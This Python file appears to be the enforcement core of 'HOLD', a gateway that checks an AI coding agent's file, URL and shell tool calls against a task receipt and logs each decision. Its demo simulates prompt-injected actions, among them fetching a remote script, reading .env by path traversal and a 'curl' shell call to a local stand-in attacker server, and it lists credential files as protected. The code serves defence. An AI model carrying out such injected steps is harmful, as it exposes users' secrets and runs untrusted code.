"""
HOLD enforcement core: deterministic capability gate, guarded tools and decision
telemetry for one task-scoped MCP gateway.

Be precise about what this is when presenting it:
- It is the enforcement core. `hold/server.py` exposes `Gateway.call` as MCP tools
  through the official MCP Python SDK. Nothing in this file speaks MCP.
- HOLD governs only the tools routed through it. Claude Code's built-in tools must be
  disabled for the demo (see SPEC.md). HOLD is not a sandbox and not a firewall.
- With a `write_scanner` (hold/scan.py), every write the gate allows is also scanned by
  Semgrep for NEW network/exec/dynamic-code calls before it is written; scanner errors DENY.
- Every decision goes to a local JSONL audit file. It also goes to ClickHouse when
  CLICKHOUSE_HOST is set and `clickhouse-connect` is installed.
- When this runs as an MCP stdio server, stdout IS the protocol channel. Never print to
  stdout from server code; diagnostics go to stderr.

`python -m hold.core` (or `python architecture.py`) runs a self-contained demo against a
temporary workspace and a local HTTP server, so it needs no internet access and no real
secrets.
"""

from __future__ import annotations

import hashlib
import http.server
import json
import os
import queue
import re
import sys
import tempfile
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
import uuid
from dataclasses import dataclass
from datetime import datetime, timezone
from functools import lru_cache
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional, Tuple

if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8")


# ============================================================================
# 1. Intent Receipt
# ============================================================================

# Always protected, for reads and writes. A receipt can add patterns but never remove these.
DEFAULT_PROTECTED: Tuple[str, ...] = (
    "**/.env", "**/.env.*", "**/*.pem", "**/*.key", "**/id_rsa*", "**/id_ed25519*",
    "**/.git/**", "**/.github/workflows/**", "**/.aws/**", "**/.ssh/**",
    "**/.npmrc", "**/.pypirc", "**/.netrc",
    # Agent-config files: writing these would plant instructions or hooks for later sessions.
    "**/.claude/**", "**/.mcp.json",
)

_RECEIPT_KEYS = {"task_id", "intent", "workspace_root", "capabilities"}
_CAPABILITY_KEYS = {"read", "write", "protected", "network_egress", "host_allowlist",
                    "shell_execution", "git_push"}


@dataclass(frozen=True)
class IntentReceipt:
    """Developer-approved capability set for one task. Loaded once; immutable afterwards."""

    task_id: str
    intent: str
    workspace_root: Path
    read: Tuple[str, ...]
    write: Tuple[str, ...]
    protected: Tuple[str, ...]
    network_egress: bool
    host_allowlist: Tuple[str, ...]
    digest: str  # SHA-256 of the canonical receipt JSON. A digest, NOT a signature.

    @classmethod
    def from_dict(cls, data: Dict[str, Any], base_dir: Path) -> "IntentReceipt":
        unknown = set(data) - _RECEIPT_KEYS
        caps = data.get("capabilities", {})
        unknown |= {f"capabilities.{k}" for k in set(caps) - _CAPABILITY_KEYS}
        if unknown:
            raise ValueError(f"unknown receipt fields: {sorted(unknown)}")
        # This gateway offers no shell or git tools, so a receipt granting them is a mistake.
        if caps.get("shell_execution") or caps.get("git_push"):
            raise ValueError("shell_execution / git_push are not supported by this gateway")
        hosts = tuple(h.lower().rstrip(".") for h in caps.get("host_allowlist", []))
        root = Path(os.path.realpath(base_dir / data["workspace_root"]))
        if not root.is_dir():
            raise ValueError(f"workspace_root does not exist: {root}")
        canonical = json.dumps(data, sort_keys=True, separators=(",", ":")).encode("utf-8")
        return cls(
            task_id=str(data["task_id"]),
            intent=str(data["intent"]),
            workspace_root=root,
            read=tuple(caps.get("read", [])),
            write=tuple(caps.get("write", [])),
            protected=DEFAULT_PROTECTED + tuple(caps.get("protected", [])),
            network_egress=bool(caps.get("network_egress", False)),
            host_allowlist=hosts,
            digest=hashlib.sha256(canonical).hexdigest(),
        )

    @classmethod
    def load(cls, path: Path) -> "IntentReceipt":
        """Load from a file the agent cannot write (keep it outside workspace_root)."""
        path = Path(path).resolve()
        return cls.from_dict(json.loads(path.read_text(encoding="utf-8")), path.parent)


# ============================================================================
# 2. Deterministic capability gate
# ============================================================================

@lru_cache(maxsize=256)
def compile_glob(pattern: str, ignore_case: bool = False) -> "re.Pattern[str]":
    """Glob over '/'-separated relative paths: '**/' = zero or more directories,
    '**' = anything, '*' = anything except '/', '?' = one character except '/'."""
    out, i = [], 0
    while i < len(pattern):
        if pattern.startswith("**/", i):
            out.append("(?:.*/)?")
            i += 3
        elif pattern.startswith("**", i):
            out.append(".*")
            i += 2
        elif pattern[i] == "*":
            out.append("[^/]*")
            i += 1
        elif pattern[i] == "?":
            out.append("[^/]")
            i += 1
        else:
            out.append(re.escape(pattern[i]))
            i += 1
    return re.compile("^" + "".join(out) + "$", re.IGNORECASE if ignore_case else 0)


# The only tools HOLD offers, with their exact argument schemas.
TOOL_SCHEMAS: Dict[str, Dict[str, type]] = {
    "read_file": {"path": str},
    "write_file": {"path": str, "content": str},
    "fetch_url": {"url": str},
}
SINKS = {"read_file": "FS_READ", "write_file": "FS_WRITE", "fetch_url": "NETWORK_EGRESS"}
# Names that are not offered at all; mapped only so telemetry can categorize attempts.
UNOFFERED_SINKS = {
    "bash": "SHELL_EXEC", "bash_exec": "SHELL_EXEC", "run_command": "SHELL_EXEC",
    "execute": "SHELL_EXEC", "shell": "SHELL_EXEC",
    "git_push": "GIT_MUTATION", "push_commits": "GIT_MUTATION",
}

# Strict character allowlist for workspace-relative paths. Rejects drive letters, ':'
# (Windows alternate data streams), '~', '\0', spaces, backslashes and Unicode lookalikes.
_SAFE_PATH = re.compile(r"^[A-Za-z0-9_./-]{1,512}$")
MAX_READ_BYTES = 512 * 1024
MAX_WRITE_BYTES = 512 * 1024
MAX_FETCH_BYTES = 256 * 1024


@dataclass
class GateDecision:
    allowed: bool
    sink: str
    target: str  # safe-to-log description: workspace path or scheme://host, never content
    reason: str
    resolved_path: Optional[Path] = None
    latency_ns: int = 0


def _deny(sink: str, target: str, reason: str) -> GateDecision:
    return GateDecision(False, sink, target, reason)


class CapabilityGate:
    """Pure decision function: (tool, arguments) -> ALLOW/DENY. Never raises; fails closed."""

    def __init__(self, receipt: IntentReceipt):
        self.receipt = receipt
        self._read = [compile_glob(p) for p in receipt.read]
        self._write = [compile_glob(p) for p in receipt.write]
        # Protected patterns are case-insensitive so '.ENV' cannot slip past on any OS.
        self._protected = [compile_glob(p, ignore_case=True) for p in receipt.protected]

    def evaluate(self, tool: Any, args: Any) -> GateDecision:
        start = time.perf_counter_ns()
        try:
            decision = self._evaluate(tool, args)
        except Exception as exc:  # fail closed on anything unexpected
            decision = _deny("UNKNOWN", "", f"gate error ({type(exc).__name__}); failing closed")
        decision.latency_ns = time.perf_counter_ns() - start
        return decision

    def _evaluate(self, tool: Any, args: Any) -> GateDecision:
        name = tool if isinstance(tool, str) else repr(tool)
        schema = TOOL_SCHEMAS.get(name)
        if schema is None:
            return _deny(UNOFFERED_SINKS.get(name, "UNKNOWN_TOOL"), name[:80],
                         f"tool '{name[:80]}' is not offered by HOLD")
        sink = SINKS[name]
        if (not isinstance(args, dict) or set(args) != set(schema)
                or any(not isinstance(args[k], t) for k, t in schema.items())):
            return _deny(sink, "", f"arguments do not match the {name} schema {sorted(schema)}")
        if name == "fetch_url":
            return self._check_url(args["url"])
        return self._check_path(args["path"], write=(name == "write_file"), sink=sink)

    def _is_protected(self, rel: str) -> bool:
        return any(p.match(rel) for p in self._protected)

    def _check_path(self, raw: str, write: bool, sink: str) -> GateDecision:
        shown = raw[:120]
        if not _SAFE_PATH.match(raw):
            return _deny(sink, shown, "path is empty, too long, or contains disallowed characters")
        if raw.startswith("/"):
            return _deny(sink, shown, "absolute paths are not allowed; use workspace-relative paths")
        parts = raw.split("/")
        # Reject rather than normalize: '..', '.', empty segments, and trailing dots
        # (Windows silently maps '.env.' to '.env').
        if any(p in ("", ".", "..") or p.endswith(".") for p in parts):
            return _deny(sink, shown, "path traversal or non-canonical path segment")

        lexical = "/".join(parts)
        root = self.receipt.workspace_root
        real = Path(os.path.realpath(root.joinpath(*parts)))
        try:
            real_rel = real.relative_to(root).as_posix()
        except ValueError:
            return _deny(sink, lexical, "path resolves outside the workspace (symlink escape)")

        # Check both the requested path and what it actually resolves to.
        for candidate in {lexical, real_rel}:
            if self._is_protected(candidate):
                return _deny(sink, lexical, f"protected resource '{candidate}'")
        # A write must land on exactly the path that was checked (and that the write scan
        # classifies), not on another file via a symlink, junction or case alias.
        if write and real_rel != lexical:
            return _deny(sink, lexical, f"write through a link not allowed (resolves to '{real_rel}')")

        allowlist, kind = (self._write, "write") if write else (self._read, "read")
        if not all(any(p.match(c) for p in allowlist) for c in {lexical, real_rel}):
            return _deny(sink, lexical, f"outside the receipt's {kind} allowlist")
        return GateDecision(True, sink, lexical, "within receipt", resolved_path=real)

    def _check_url(self, raw: str) -> GateDecision:
        sink = "NETWORK_EGRESS"
        parts = urllib.parse.urlsplit(raw)
        host = (parts.hostname or "").lower().rstrip(".")
        # Log scheme://host only: paths and query strings are a common exfiltration channel.
        shown = f"{parts.scheme}://{host}" if host else raw[:60]
        if parts.scheme not in ("http", "https"):
            return _deny(sink, shown, f"scheme '{parts.scheme}' not allowed")
        if parts.username is not None or parts.password is not None:
            return _deny(sink, shown, "credentials in URL not allowed")
        if not host:
            return _deny(sink, shown, "URL has no host")
        if not self.receipt.network_egress:
            return _deny(sink, shown, f"network egress not granted by the receipt (host '{host}')")
        if host not in self.receipt.host_allowlist:
            return _deny(sink, shown, f"host '{host}' is not in the receipt's host_allowlist")
        return GateDecision(True, sink, shown, "host in allowlist")


# ============================================================================
# 3. Telemetry (non-blocking; enforcement never depends on it)
# ============================================================================

EVENT_COLUMNS = [
    "event_id", "ts", "task_id", "agent_id", "request_id", "tool_name", "sink",
    "target", "decision", "reason", "exec_status", "gate_latency_ns", "intent_digest",
]


class JsonlWriter:
    """Local audit file. Always on, so there is evidence even if ClickHouse is down.

    `synchronous = True`: Telemetry writes it inline in `emit`, i.e. before Gateway.call
    returns, so a process killed right after answering still has the row on disk."""

    synchronous = True

    def __init__(self, path: Path):
        self.path = Path(path)

    def __call__(self, batch: List[Dict[str, Any]]) -> None:
        with self.path.open("a", encoding="utf-8") as f:
            for event in batch:
                f.write(json.dumps(event, default=str) + "\n")
            f.flush()  # hand the bytes to the OS before returning (close() would too)


class ClickHouseWriter:
    """Batched inserts into `hold_events` (see SPEC.md for the table).

    The client is created lazily on the telemetry thread, so a slow or unreachable
    ClickHouse never delays MCP startup or a tool call.
    """

    def __init__(self, table: str = "hold_events"):
        self.table = table
        self._client = None

    @staticmethod
    def configured() -> bool:
        return bool(os.environ.get("CLICKHOUSE_HOST"))

    def _connect(self):
        import clickhouse_connect  # pip install clickhouse-connect

        return clickhouse_connect.get_client(
            host=os.environ["CLICKHOUSE_HOST"],
            port=int(os.environ.get("CLICKHOUSE_PORT", "8443")),
            username=os.environ.get("CLICKHOUSE_USER", "default"),
            password=os.environ.get("CLICKHOUSE_PASSWORD", ""),
            database=os.environ.get("CLICKHOUSE_DATABASE", "default"),
            secure=os.environ.get("CLICKHOUSE_SECURE", "1") == "1",
        )

    def __call__(self, batch: List[Dict[str, Any]]) -> None:
        if self._client is None:
            self._client = self._connect()
        rows = [[event[c] for c in EVENT_COLUMNS] for event in batch]
        self._client.insert(self.table, rows, column_names=EVENT_COLUMNS)


class Telemetry:
    """Synchronous local writers + queue/background thread for the rest. `emit` never raises.

    Writers marked `synchronous = True` (JsonlWriter) are written inline, under a lock,
    before `emit` returns: a local append, not network I/O. All other writers (ClickHouse)
    are batched on the background thread and never delay a tool call."""

    def __init__(self, writers: List[Callable[[List[Dict[str, Any]]], None]],
                 flush_interval: float = 0.25, max_queue: int = 10_000, max_batch: int = 500):
        self.writers = writers
        self.flush_interval = flush_interval
        self.max_batch = max_batch
        self.dropped = 0
        self.writer_errors: Dict[str, int] = {}
        self._sync = [w for w in writers if getattr(w, "synchronous", False) is True]
        self._async = [w for w in writers if getattr(w, "synchronous", False) is not True]
        self._sync_lock = threading.Lock()
        self._q: "queue.Queue[Optional[Dict[str, Any]]]" = queue.Queue(maxsize=max_queue)
        self._thread = threading.Thread(target=self._run, name="hold-telemetry", daemon=True)
        self._thread.start()

    def emit(self, event: Dict[str, Any]) -> None:
        if self._sync:
            with self._sync_lock:
                self._write([event], self._sync)
        if self._async:
            try:
                self._q.put_nowait(event)
            except queue.Full:
                self.dropped += 1

    def close(self, timeout: float = 5.0) -> None:
        """Flush what is queued and stop. Call on shutdown and before reading results."""
        try:
            self._q.put(None, timeout=timeout)
        except queue.Full:
            pass
        self._thread.join(timeout)

    def _run(self) -> None:
        stopping = False
        while not stopping:
            batch: List[Dict[str, Any]] = []
            deadline = time.monotonic() + self.flush_interval
            while len(batch) < self.max_batch:
                try:
                    item = self._q.get(timeout=max(0.0, deadline - time.monotonic()))
                except queue.Empty:
                    break
                if item is None:
                    stopping = True
                    break
                batch.append(item)
            if batch:
                self._write(batch, self._async)

    def _write(self, batch: List[Dict[str, Any]], writers: List[Callable[..., None]]) -> None:
        for writer in writers:
            try:
                writer(batch)
            except Exception as exc:
                name = type(writer).__name__
                self.writer_errors[name] = self.writer_errors.get(name, 0) + 1
                try:
                    print(f"[hold] telemetry writer {name} failed: {type(exc).__name__}: {exc}",
                          file=sys.stderr)
                except Exception:
                    pass  # stderr unusable; the error is still counted


# ============================================================================
# 4. Gateway: gate + guarded execution + telemetry
# ============================================================================

@dataclass
class ToolResult:
    is_error: bool  # map to MCP CallToolResult.isError so the model sees the reason
    text: str


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    """A redirect could move an allowlisted request to a host the gate never approved."""

    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def default_http_open(url: str) -> str:
    opener = urllib.request.build_opener(urllib.request.ProxyHandler({}), _NoRedirect())
    try:
        with opener.open(url, timeout=5) as resp:
            return resp.read(MAX_FETCH_BYTES).decode("utf-8", errors="replace")
    except urllib.error.HTTPError as exc:  # includes refused redirects
        exc.close()
        raise


_OPEN_FLAGS = getattr(os, "O_NOFOLLOW", 0) | getattr(os, "O_BINARY", 0)


class Gateway:
    """The MCP tool handlers call `call()`. Denied calls never reach the executor.

    `write_scanner` (optional, see `hold/scan.py`): called as
    `write_scanner(rel_path, old_content, new_content)` for every write_file the gate
    ALLOWs, before anything is written. A verdict whose `allowed` is not exactly True, or
    any exception, turns the call into a DENY (sink FS_WRITE, exec_status not_run).
    """

    def __init__(self, receipt: IntentReceipt, telemetry: Telemetry,
                 http_open: Callable[[str], str] = default_http_open,
                 agent_id: str = "claude-code", write_scanner: Optional[Callable[..., Any]] = None):
        self.receipt = receipt
        self.gate = CapabilityGate(receipt)
        self.telemetry = telemetry
        self.http_open = http_open
        self.agent_id = agent_id
        self.write_scanner = write_scanner

    def call(self, tool: str, args: Dict[str, Any], request_id: str = "") -> ToolResult:
        decision = self.gate.evaluate(tool, args)
        # `shown` goes to the agent; `reason` goes to telemetry (adds the scan time).
        allowed, shown, reason = decision.allowed, decision.reason, decision.reason
        if allowed and tool == "write_file" and self.write_scanner is not None:
            allowed, shown, scan_ms = self._scan_write(args, decision)
            reason = f"{shown} (scan {scan_ms:.0f} ms)"
            if allowed:
                reason = f"{decision.reason}; {reason}"
        if not allowed:
            result, status = ToolResult(True, f"HOLD denied {tool}: {shown}"), "not_run"
        else:
            try:
                result, status = ToolResult(False, self._execute(tool, args, decision)), "ok"
            except Exception as exc:
                result, status = ToolResult(True, f"{tool} failed: {type(exc).__name__}: {exc}"), "error"
        self.telemetry.emit({
            "event_id": uuid.uuid4(),
            "ts": datetime.now(timezone.utc),
            "task_id": self.receipt.task_id,
            "agent_id": self.agent_id,
            "request_id": str(request_id),
            "tool_name": str(tool)[:80],
            "sink": decision.sink,
            "target": decision.target,
            "decision": "ALLOW" if allowed else "DENY",
            "reason": reason,
            "exec_status": status,
            "gate_latency_ns": decision.latency_ns,  # gate only; scan time is in the reason
            "intent_digest": self.receipt.digest,
        })
        return result

    def _scan_write(self, args: Dict[str, Any], decision: GateDecision) -> Tuple[bool, str, float]:
        """Run the write scanner on (current content, proposed content). Fails closed:
        returns (allowed, reason, elapsed_ms) and never raises."""
        start = time.perf_counter()

        def ms() -> float:
            return (time.perf_counter() - start) * 1000.0

        try:
            content = args["content"]
            if len(content.encode("utf-8")) > MAX_WRITE_BYTES:
                return False, f"content exceeds {MAX_WRITE_BYTES} bytes; not scanned, not written", ms()
            root = self.receipt.workspace_root
            scratch = getattr(self.write_scanner, "scratch_dir", None)
            if scratch is not None:
                real = Path(os.path.realpath(scratch))
                if real == root or root in real.parents:
                    return False, "Semgrep error: scan scratch dir is inside the agent workspace", ms()
            try:
                old = self._read_baseline(decision.resolved_path)
            except Exception as exc:
                return False, f"scan error: could not read the current file ({type(exc).__name__})", ms()
            # The gate already denies writes whose resolved path differs from the requested
            # one; the scanner still gets both so its Python/not-Python choice cannot be fooled.
            resolved = decision.resolved_path.relative_to(root).as_posix()
            verdict = self.write_scanner(decision.target, old, content, resolved_path=resolved)
            ok = getattr(verdict, "allowed", None)
            if not isinstance(ok, bool):
                return False, "Semgrep error: scanner returned an invalid verdict; failing closed", ms()
            text = " ".join(str(getattr(verdict, "reason", "")).split())[:300]
            return ok, text or ("scan passed" if ok else "scan denied"), ms()
        except Exception as exc:
            return False, f"Semgrep error: scanner raised {type(exc).__name__}; failing closed", ms()

    @staticmethod
    def _read_baseline(path: Optional[Path]) -> str:
        """Current content of an authorized write target ('' if it does not exist yet)."""
        if path is None or Path(os.path.realpath(path)) != path:
            raise PermissionError("path changed after authorization")
        try:
            fd = os.open(path, os.O_RDONLY | _OPEN_FLAGS)
        except FileNotFoundError:
            return ""
        with os.fdopen(fd, "rb") as f:
            return f.read(MAX_READ_BYTES).decode("utf-8", errors="replace")

    def _execute(self, tool: str, args: Dict[str, Any], decision: GateDecision) -> str:
        if tool == "fetch_url":
            return self.http_open(args["url"])
        path = decision.resolved_path
        # Re-resolve right before use, in case a symlink appeared after the decision.
        # Residual race: on Windows there is no O_NOFOLLOW. With no shell tool the agent
        # cannot create symlinks itself; the remaining risk is symlinks already in the repo.
        if Path(os.path.realpath(path)) != path:
            raise PermissionError("path changed after authorization")
        if tool == "read_file":
            fd = os.open(path, os.O_RDONLY | _OPEN_FLAGS)
            with os.fdopen(fd, "rb") as f:
                return f.read(MAX_READ_BYTES).decode("utf-8", errors="replace")
        if tool == "write_file":
            data = args["content"].encode("utf-8")
            if len(data) > MAX_WRITE_BYTES:
                raise ValueError(f"content exceeds {MAX_WRITE_BYTES} bytes")
            fd = os.open(path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC | _OPEN_FLAGS, 0o644)
            with os.fdopen(fd, "wb") as f:
                f.write(data)
            return f"wrote {len(data)} bytes to {decision.target}"
        raise AssertionError(f"no executor for {tool}")  # unreachable: gate denies unknown tools


# ============================================================================
# 5. Self-contained demo (no internet, no real secrets)
# ============================================================================

BUGGY_APP = '''def get_user_name(user):
    return user.name.upper()  # crashes with AttributeError when user is None
'''
FIXED_APP = '''def get_user_name(user):
    if user is None:
        return ""
    return user.name.upper()
'''


class _CountingHandler(http.server.BaseHTTPRequestHandler):
    hits = 0

    def do_GET(self):
        type(self).hits += 1
        body = b"print('reproduction script')\n"
        self.send_response(200)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *args):
        pass


def _build_workspace(base: Path) -> Path:
    ws = base / "workspace"
    (ws / "src" / "flask").mkdir(parents=True)
    (ws / "src" / "flask" / "app.py").write_bytes(BUGGY_APP.encode("utf-8"))
    (ws / ".env").write_text("FAKE_TOKEN=not-a-real-secret\n", encoding="utf-8")
    (ws / "ISSUE.md").write_text("get_user_name crashes on None.\n", encoding="utf-8")
    return ws


def _receipt(base: Path, **caps: Any) -> IntentReceipt:
    capabilities = {"read": ["src/**", "tests/**", "ISSUE.md"], "write": ["src/flask/app.py"],
                    "network_egress": False, "host_allowlist": []}
    capabilities.update(caps)
    return IntentReceipt.from_dict({"task_id": "hold-demo-001",
                                    "intent": "Fix NoneType crash in src/flask/app.py",
                                    "workspace_root": "workspace",
                                    "capabilities": capabilities}, base)


def gate_latency_ns(gate: CapabilityGate, n: int = 2000) -> Tuple[int, int]:
    """Gate-only p50/p95 in ns on this machine. Excludes MCP transport, tool execution,
    telemetry and model time; report it as exactly that."""
    calls = [("read_file", {"path": "src/flask/app.py"}), ("read_file", {"path": "src/../.env"}),
             ("write_file", {"path": "src/flask/app.py", "content": "x"}),
             ("fetch_url", {"url": "https://example.com/x"}), ("bash_exec", {"command": "id"})]
    samples = sorted(gate.evaluate(*calls[i % len(calls)]).latency_ns for i in range(n))
    return samples[n // 2], samples[int(n * 0.95)]


def run_demo() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        base = Path(tmp)
        ws = _build_workspace(base)
        audit = base / "audit.jsonl"
        writers: List[Callable] = [JsonlWriter(audit)]
        if ClickHouseWriter.configured():
            writers.append(ClickHouseWriter())
        telemetry = Telemetry(writers)

        server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), _CountingHandler)
        threading.Thread(target=server.serve_forever, daemon=True).start()
        url = f"http://127.0.0.1:{server.server_address[1]}/reproduce_issue.py"

        receipt = _receipt(base)
        hold = Gateway(receipt, telemetry)
        print("HOLD demo  | task:", receipt.intent)
        print(f"receipt    | write={list(receipt.write)} network_egress={receipt.network_egress}"
              f" digest={receipt.digest[:16]}...")
        print("telemetry  |", ", ".join(type(w).__name__ for w in writers))
        print("-" * 78)

        steps = [
            ("read the target file", "read_file", {"path": "src/flask/app.py"}),
            ("read the issue", "read_file", {"path": "ISSUE.md"}),
            ("injected: fetch remote script", "fetch_url", {"url": url}),
            ("injected: read secrets", "read_file", {"path": ".env"}),
            ("injected: traversal to secrets", "read_file", {"path": "src/../.env"}),
            ("injected: shell", "bash_exec", {"command": f"curl -s {url}"}),
            ("apply the authorized fix", "write_file", {"path": "src/flask/app.py", "content": FIXED_APP}),
        ]
        for label, tool, args in steps:
            result = hold.call(tool, args)
            verdict = "DENY " if result.is_error else "ALLOW"
            print(f"{verdict} | {label:<32} | {result.text.splitlines()[0][:70]}")

        fixed = (ws / "src" / "flask" / "app.py").read_bytes() == FIXED_APP.encode("utf-8")
        print("-" * 78)
        print(f"app.py fixed on disk: {fixed}")
        print(f"requests received by the 'attacker' server under the deny receipt: {_CountingHandler.hits}")

        # Positive control: same tool, same URL, receipt that grants the host. Proves the
        # gate made the decision, not the absence of a network tool.
        control = Gateway(_receipt(base, network_egress=True, host_allowlist=["127.0.0.1"]), telemetry)
        result = control.call("fetch_url", {"url": url})
        print(f"positive control (receipt allows 127.0.0.1): "
              f"{'DENY' if result.is_error else 'ALLOW'}, server hits now {_CountingHandler.hits}")
        server.shutdown()
        server.server_close()

        p50, p95 = gate_latency_ns(hold.gate)
        print(f"gate-only decision latency on this machine: p50 {p50 / 1000:.1f} us, p95 {p95 / 1000:.1f} us")

        telemetry.close()
        print("-" * 78)
        print("audit log (local JSONL):")
        for line in audit.read_text(encoding="utf-8").splitlines():
            e = json.loads(line)
            print(f"  {e['decision']:<5} {e['sink']:<15} {e['target'][:34]:<34} {e['exec_status']:<7}"
                  f" {int(e['gate_latency_ns']) / 1000:6.1f} us")
        if telemetry.writer_errors or telemetry.dropped:
            print(f"telemetry problems: errors={telemetry.writer_errors} dropped={telemetry.dropped}")


if __name__ == "__main__":
    run_demo()
